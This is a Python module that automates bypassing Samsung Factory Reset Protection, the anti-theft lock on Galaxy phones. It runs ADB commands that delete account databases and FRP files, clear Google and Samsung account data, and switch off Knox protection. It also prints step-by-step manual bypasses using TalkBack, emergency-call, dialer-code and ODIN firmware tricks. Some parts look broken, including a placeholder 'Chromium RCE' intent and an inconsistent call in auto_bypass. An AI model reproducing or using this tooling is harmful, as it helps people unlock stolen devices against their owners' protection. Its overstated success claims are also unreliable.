#!/usr/bin/env python3
"""
Samsung FRP Bypass Module (Combined)

Combined implementation of multiple Samsung FRP bypass methods from:
- samsung_frp.py (ADB, dialer codes, TalkBack, emergency call, download mode)
- samsung_frp_exploit.py (test settings, dialer test menu)
- samsung_frp2.py (TalkBack, Chromium RCE, Knox, VaultKeeper)

Supports Galaxy S/A/J/Note/Tab/Fold series with Android 5-15.
"""

import subprocess
import time
import re
import logging
from typing import Optional, List, Tuple, Dict, Any
from dataclasses import dataclass
from enum import Enum

from utils.logger import get_logger
from core.adb_bridge import ADBBridge


class SamsungFRPMethod(Enum):
    """Available Samsung FRP bypass methods"""
    ADB_SAMSUNG = "adb_samsung"
    DIALER_CODE = "dialer_code"
    EMERGENCY_CALL = "emergency_call"
    TALKBACK_BYPASS = "talkback_bypass"
    DOWNLOAD_MODE = "download_mode"
    TEST_SETTINGS = "test_settings"
    TEST_MENU = "test_menu"
    CHROMIUM_RCE = "chromium_rce"
    KNOX_BYPASS = "knox_bypass"
    VAULTKEEPER_BYPASS = "vaultkeeper_bypass"
    SETUP_WIZARD = "setup_wizard"


@dataclass
class SamsungFRPResult:
    """Result of Samsung FRP bypass attempt"""
    success: bool
    method: SamsungFRPMethod
    message: str
    details: Optional[str] = None
    requires_manual: bool = False


class SamsungFRP:
    """
    Combined Samsung FRP Bypass Implementation
    
    Supports multiple methods for bypassing Factory Reset Protection
    on Samsung Galaxy devices running Android 5-15.
    """
    
    SAMSUNG_MODELS = [
        'SM-G', 'SM-A', 'SM-J', 'SM-M', 'SM-N', 'SM-T', 'SM-F', 'SM-S',
        'GT-', 'SGH-', 'SCH-', 'SPH-',
    ]
    
    def __init__(self, device_info: Dict[str, Any], logger: Optional[logging.Logger] = None):
        self.device_info = device_info
        self.logger = logger or get_logger("bypass")
        self.adb = ADBBridge()
        self.serial = device_info.get('serial')
    
    def is_samsung_device(self, model: str = None) -> bool:
        """Check if device is Samsung based on model number"""
        model = model or self.device_info.get('model', '')
        model_upper = model.upper()
        return any(model_upper.startswith(prefix.upper()) for prefix in self.SAMSUNG_MODELS)
    
    def _android_version(self) -> int:
        """Get Android version as integer"""
        success, output = self.adb.shell('getprop ro.build.version.release', self.serial)
        if not success:
            return 0
        version = re.findall(r'\d+', output)
        return int(version[0]) if version else 0
    
    def bypass_adb_samsung(self) -> SamsungFRPResult:
        """
        Method 1: Samsung ADB FRP Bypass
        Uses ADB commands specific to Samsung devices to remove FRP.
        Requires USB debugging enabled.
        """
        commands = [
            ['shell', 'pm', 'clear', 'com.samsung.android.samsungaccount'],
            ['shell', 'pm', 'clear', 'com.samsung.account'],
            ['shell', 'rm', '-rf', '/data/data/com.google.android.gsf'],
            ['shell', 'rm', '-rf', '/data/data/com.google.android.gms'],
            ['shell', 'rm', '-rf', '/data/data/com.google.android.apps.maps'],
            ['shell', 'rm', '-rf', '/data/system/users/0/accounts.db'],
            ['shell', 'rm', '-rf', '/data/system/users/0/accounts.db-journal'],
            ['shell', 'rm', '-rf', '/data/system/users/0/pmw*.xml'],
            ['shell', 'rm', '-rf', '/data/system/users/0/settings_frp.xml'],
            ['shell', 'rm', '-rf', '/data/system/users/0/fpData.xml'],
            ['shell', 'rm', '-rf', '/data/system/users/0/FRP.xml'],
            ['shell', 'pm', 'clear', 'com.google.android.gsf'],
            ['shell', 'pm', 'clear', 'com.google.android.gms'],
            ['shell', 'pm', 'clear', 'com.samsung.android.providers.context'],
            ['shell', 'pm', 'disable', 'com.google.android.gsf/.frp'],
        ]
        
        results = []
        for cmd in commands:
            success, _ = self.adb.shell(' '.join(cmd), self.serial)
            results.append(success)
        
        success_count = sum(1 for r in results if r)
        
        if success_count > 0:
            self.adb.shell('reboot', self.serial)
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.ADB_SAMSUNG,
                message=f"Samsung FRP bypass completed. {success_count}/{len(commands)} commands executed.",
                details="Device will reboot. FRP should be bypassed after restart."
            )
        
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.ADB_SAMSUNG,
            message="Failed to execute FRP bypass commands. Device may not be rooted or ADB not authorized."
        )
    
    def bypass_talkback(self) -> SamsungFRPResult:
        """TalkBack Accessibility Bypass for Samsung devices"""
        instructions = """
Samsung FRP Bypass via TalkBack:

Step 1: Enable TalkBack
1. On the FRP lock screen, tap "Vision" or "Accessibility"
2. Tap "TalkBack" and turn it ON
3. Draw an 'L' shape on the screen with your finger
4. This opens the TalkBack tutorial/settings

Step 2: Access Help
1. In TalkBack settings, tap "Help & Feedback"
2. Tap on any help article
3. This opens a browser or WebView

Step 3: Bypass via Browser
- Navigate to google.com and sign in with your Google account
- OR download a FRP bypass APK and install it

After Bypass:
- Go to Settings > Accounts
- Add your Google account
- Restart device
"""
        return SamsungFRPResult(
            success=True,
            method=SamsungFRPMethod.TALKBACK_BYPASS,
            message="Manual bypass instructions provided.",
            details=instructions,
            requires_manual=True
        )
    
    def bypass_emergency_call(self) -> SamsungFRPResult:
        """Emergency Call Bypass for Samsung devices"""
        instructions = """
Samsung FRP Bypass via Emergency Call:

Method 1 - Notification Access:
1. Tap "Emergency Call" on FRP lock screen
2. Dial any number but don't call
3. Quickly tap and hold the number field
4. Select "Cut" or "Copy"
5. Look for "Settings" or "Apps" option
6. Navigate to Settings > Accounts to add Google account

Method 2 - Contacts Access:
1. Tap "Emergency Call"
2. Tap "Emergency information" at top
3. Tap the "+" to add emergency contact
4. Tap "Add account" option
5. Add Google account

Method 3 - Samsung Keyboard:
1. On FRP screen, tap any text field
2. Long-press the microphone or settings key
3. Look for "Text shortcuts" or "Clipboard"
4. Try to access Settings from keyboard settings
"""
        return SamsungFRPResult(
            success=True,
            method=SamsungFRPMethod.EMERGENCY_CALL,
            message="Manual bypass instructions provided.",
            details=instructions,
            requires_manual=True
        )
    
    def bypass_download_mode(self) -> SamsungFRPResult:
        """Download Mode (ODIN) Bypass for Samsung devices"""
        instructions = """
Samsung FRP Bypass via Download Mode (ODIN):

Prerequisites:
- Windows PC
- Samsung USB Drivers installed
- ODIN3 software (latest version)
- Combination file for your specific model

Step 1: Enter Download Mode
1. Power off the Samsung device completely
2. Press and hold: Volume Down + Volume Up (both) + Power
3. When warning screen appears, press Volume Up to continue

Step 2: Flash with ODIN
1. Download combination file for your exact model
2. Extract the .tar or .tar.md5 file
3. Open ODIN3
4. Put file in AP or CSC slot
5. Connect device to PC
6. Click "Start"
7. Wait for "Pass" message
8. Device reboots with FRP disabled

Warning:
- Flashing incorrect firmware can brick device
- Always verify model number before flashing
"""
        return SamsungFRPResult(
            success=True,
            method=SamsungFRPMethod.DOWNLOAD_MODE,
            message="Download mode instructions provided.",
            details=instructions,
            requires_manual=True
        )
    
    def bypass_dialer_code(self) -> SamsungFRPResult:
        """Dialer Code Bypass for Samsung devices"""
        instructions = """
Samsung FRP Bypass via Dialer Codes:

Method A - Service Mode:
1. On the FRP lock screen, tap "Emergency Call"
2. Dial *#0*# to enter service mode
3. Look for "FRP" or "Factory Reset" option
4. If found, select it to bypass FRP

Method B - USB Settings:
1. From emergency dialer, dial *#0808#
2. This opens USB settings
3. Change USB mode to "MTP + ADB"
4. Connect to PC and use ADB method

Method C - Quick Test Menu:
1. Dial *#7353# from emergency dialer
2. Look for diagnostic options
3. Some Samsung models allow FRP bypass from here

Important Notes:
- These codes work differently on various Samsung models
- Some codes may be blocked by Samsung security updates
"""
        return SamsungFRPResult(
            success=True,
            method=SamsungFRPMethod.DIALER_CODE,
            message="Manual bypass instructions provided.",
            details=instructions,
            requires_manual=True
        )
    
    def _launch_test_settings(self) -> bool:
        """Launch Samsung test settings activity"""
        self.logger.info('SamsungFRP: launching Test Settings activity.')
        success, output = self.adb.shell(
            'am start -a android.intent.action.MAIN -n com.android.settings/.TestSettings',
            self.serial,
            timeout=15
        )
        if success and 'Error' not in output:
            self.logger.info('SamsungFRP: Test Settings activity response: %s', output.strip())
            return True
        return False
    
    def _dial_test_menu(self) -> bool:
        """Dial test menu code *#0*#"""
        self.logger.info('SamsungFRP: opening dialer and dialing *#0*#.')
        if not self.adb.shell('am start -a android.intent.action.DIAL', self.serial)[0]:
            self.logger.warning('SamsungFRP: failed to launch dialer.')
        
        commands = [
            'input text "*#0*#"',
            'input keyevent KEYCODE_ENTER',
            'sleep 1',
            'input keyevent KEYCODE_DPAD_DOWN',
            'input keyevent KEYCODE_DPAD_DOWN',
            'input keyevent KEYCODE_DPAD_RIGHT',
            'sleep 1',
            'am start -a android.intent.action.VIEW -n com.android.chrome/com.google.android.apps.chrome.Main'
        ]
        for command in commands:
            success, output = self.adb.shell(command, self.serial, timeout=10)
            if not success:
                self.logger.debug(f'SamsungFRP: command failed: {command} -> {output}')
                continue
            time.sleep(0.8)
        
        success, output = self.adb.shell('dumpsys window windows | grep -E "mCurrentFocus|mFocusedApp"', self.serial)
        return success and 'chrome' in output.lower()
    
    def _bypass_samsung_talkback(self) -> bool:
        """Bypass FRP using Samsung TalkBack (Android 12-14)"""
        try:
            success1 = self.adb.shell(
                "settings put secure enabled_accessibility_services com.samsung.android.accessibility.talkback/com.samsung.android.marvin.talkback.TalkBackService",
                self.serial
            )[0]
            success2 = self.adb.shell("settings put secure accessibility_enabled 1", self.serial)[0]
            success3 = self.adb.shell("am start -n com.android.settings/.Settings", self.serial)[0]
            return all([success1, success2, success3])
        except Exception as e:
            self.logger.error(f"Samsung TalkBack bypass failed: {e}")
            return False
    
    def _bypass_samsung_chromium(self) -> bool:
        """Bypass FRP using Chromium RCE (Android 13-14)"""
        try:
            success1 = self.adb.shell(
                "am start -n com.android.chrome/.Main -d 'intent://exploit#Intent;scheme=chrome;end'",
                self.serial
            )[0]
            if not success1:
                success1 = self.adb.shell(
                    "am start -n com.sec.android.app.sbrowser/.SBrowserMainActivity",
                    self.serial
                )[0]
            return success1
        except Exception as e:
            self.logger.error(f"Samsung Chromium bypass failed: {e}")
            return False
    
    def _bypass_samsung_knox(self) -> bool:
        """Bypass FRP using Knox workaround"""
        try:
            success1 = self.adb.shell("settings put global knox_active_protection 0", self.serial)[0]
            success2 = self.adb.shell("pm clear com.samsung.android.knox.containeragent", self.serial)[0]
            success3 = self.adb.shell("settings put global frp_blocked 0", self.serial)[0]
            return all([success1, success2, success3])
        except Exception as e:
            self.logger.error(f"Samsung Knox bypass failed: {e}")
            return False
    
    def _bypass_samsung_vaultkeeper(self) -> bool:
        """Bypass FRP using VaultKeeper bypass (Android 14-15)"""
        try:
            self.logger.warning("VaultKeeper bypass not implemented - requires device-specific exploit")
            return False
        except Exception as e:
            self.logger.error(f"Samsung VaultKeeper bypass failed: {e}")
            return False
    
    def execute(self) -> bool:
        """Execute Samsung-specific FRP bypass"""
        self.logger.info("Starting Samsung FRP bypass")
        
        methods = [
            self._bypass_samsung_talkback,
            self._bypass_samsung_chromium,
            self._bypass_samsung_knox,
            self._bypass_samsung_vaultkeeper
        ]
        
        for method in methods:
            method_name = method.__name__.replace('_bypass_samsung_', '')
            self.logger.info(f"Attempting Samsung FRP bypass via {method_name}")
            try:
                if method():
                    self.logger.info(f"Samsung FRP bypass successful via {method_name}")
                    return True
            except Exception as e:
                self.logger.error(f"Samsung FRP bypass method {method_name} failed: {e}")
                continue
        
        self.logger.info("Samsung-specific methods failed, trying generic FRP bypass")
        return False
    
    def get_recommended_method(self, android_version: str = None, model: str = None) -> SamsungFRPMethod:
        """Get recommended FRP bypass method based on device info"""
        if model and self.is_samsung_device(model):
            model_prefix = model[:4].upper() if len(model) >= 4 else model.upper()
            
            if model_prefix in ['SM-G9', 'SM-G8', 'SM-S9', 'SM-S8']:
                return SamsungFRPMethod.TALKBACK_BYPASS
            if model_prefix.startswith('SM-A'):
                return SamsungFRPMethod.EMERGENCY_CALL
            if model_prefix.startswith('GT-'):
                return SamsungFRPMethod.ADB_SAMSUNG
            if android_version:
                try:
                    version = float(android_version.split('.')[0])
                    if version >= 12:
                        return SamsungFRPMethod.TALKBACK_BYPASS
                    elif version >= 8:
                        return SamsungFRPMethod.EMERGENCY_CALL
                    else:
                        return SamsungFRPMethod.DIALER_CODE
                except:
                    pass
        
        return SamsungFRPMethod.TALKBACK_BYPASS
    
    def auto_bypass(self, model: str = None, android_version: str = None) -> SamsungFRPResult:
        """Automatically attempt Samsung FRP bypass"""
        ret, out, _ = self.adb.shell('get-state', self.serial)
        if ret == 0 and 'device' in out:
            result = self.bypass_adb_samsung()
            if result.success:
                return result
        
        recommended = self.get_recommended_method(android_version, model)
        if recommended == SamsungFRPMethod.TALKBACK_BYPASS:
            return self.bypass_talkback()
        elif recommended == SamsungFRPMethod.EMERGENCY_CALL:
            return self.bypass_emergency_call()
        else:
            return self.bypass_talkback()
    
    def adb_bypass(self) -> SamsungFRPResult:
        return self.bypass_adb_samsung()
    
    def talkback_bypass(self) -> SamsungFRPResult:
        return self.bypass_talkback()
    
    def odin_bypass(self) -> SamsungFRPResult:
        return self.bypass_download_mode()
    
    def google_account_bypass(self) -> SamsungFRPResult:
        return self.bypass_adb_samsung()
    
    def frp_reset(self) -> SamsungFRPResult:
        return self.auto_bypass()
    
    def test_settings_bypass(self) -> SamsungFRPResult:
        """Launch test settings to bypass FRP"""
        if self._launch_test_settings():
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.TEST_SETTINGS,
                message="Test settings launched successfully."
            )
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.TEST_SETTINGS,
            message="Failed to launch test settings."
        )
    
    def test_menu_bypass(self) -> SamsungFRPResult:
        """Dial test menu to bypass FRP"""
        if self._dial_test_menu():
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.TEST_MENU,
                message="Test menu dialed successfully."
            )
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.TEST_MENU,
            message="Failed to dial test menu."
        )
    
    def chromium_rce_bypass(self) -> SamsungFRPResult:
        """Chromium RCE bypass for Android 13-14"""
        if self._bypass_samsung_chromium():
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.CHROMIUM_RCE,
                message="Chromium RCE bypass successful."
            )
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.CHROMIUM_RCE,
            message="Chromium RCE bypass failed."
        )
    
    def knox_bypass(self) -> SamsungFRPResult:
        """Knox bypass method"""
        if self._bypass_samsung_knox():
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.KNOX_BYPASS,
                message="Knox bypass successful."
            )
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.KNOX_BYPASS,
            message="Knox bypass failed."
        )
    
    def vaultkeeper_bypass(self) -> SamsungFRPResult:
        """VaultKeeper bypass for Android 14-15"""
        if self._bypass_samsung_vaultkeeper():
            return SamsungFRPResult(
                success=True,
                method=SamsungFRPMethod.VAULTKEEPER_BYPASS,
                message="VaultKeeper bypass successful."
            )
        return SamsungFRPResult(
            success=False,
            method=SamsungFRPMethod.VAULTKEEPER_BYPASS,
            message="VaultKeeper bypass failed or not implemented."
        )
